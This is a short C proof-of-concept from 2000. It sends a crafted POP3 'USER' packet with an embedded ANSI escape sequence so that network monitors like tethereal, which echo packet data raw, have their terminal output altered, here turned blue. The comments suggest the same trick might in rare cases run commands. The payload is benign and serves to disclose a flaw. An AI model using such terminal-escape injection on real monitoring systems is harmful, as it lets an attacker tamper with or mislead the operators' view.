// Many network-monitoring tools pass user-given
// input raw to the terminal. This lets us do funny things.
// More evil, one could execute commands in very hard,
// maybe impossible cases (depends on how your terminal interprets 
// what)
// This piece turns output of 'tetheral' blue.
// (C) 2000 by S. Krahmer under the GPL. Needs libUSI++
#include <stdio.h>
#include <usi++/tcp.h>
#include <string.h>

using namespace usipp;

int main()
{
	TCP tcp("target");
	char buf[100];

	memset(buf, 0, sizeof(buf));
	tcp.set_srcport(1024);
	tcp.set_dstport(110);
	
	sprintf(buf, "USER \E[34m");	// turn tehereal's output into blue
	tcp.sendpack(buf);
	return 0;
}

